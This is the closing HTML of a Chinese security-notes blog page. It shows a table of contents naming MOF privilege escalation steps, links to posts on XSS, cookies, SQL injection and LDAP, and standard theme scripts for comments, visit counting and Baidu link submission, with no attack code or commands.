class="toc-text">提权步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">MOF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%A6%81%E6%B1%82"><span class="toc-number">1.2.2.</span> <span class="toc-text">提权要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.2.3.</span> <span class="toc-text">步骤</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2021/07/31/hello-world/" title="Hello World">Hello World</a><time datetime="2021-07-31T14:18:47.559Z" title="发表于 2021-07-31 22:18:47">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="三种xss的区别"/></a><div class="content"><a class="title" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别">三种xss的区别</a><time datetime="2021-07-31T13:23:29.000Z" title="发表于 2021-07-31 21:23:29">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie"><img src="/img/image/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cookie"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie">Cookie</a><time datetime="2021-07-31T13:22:32.000Z" title="发表于 2021-07-31 21:22:32">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译"><img src="/img/image/19.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预编译"/></a><div class="content"><a class="title" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译">预编译</a><time datetime="2021-07-31T13:19:28.000Z" title="发表于 2021-07-31 21:19:28">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LDAP"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP">LDAP</a><time datetime="2021-07-31T13:17:25.000Z" title="发表于 2021-07-31 21:17:25">2021-07-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/14.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By h0ld1rs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'VW87gUH9lGz0MqQ26R0dxvzS-gzGzoHsz',
+      appKey: 'hXDx5AOht2WentElxJRM8xnK',
+      placeholder: '来啊，快活啊!',
+      avatar: 'monsterid',
+      meta: 'nick'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
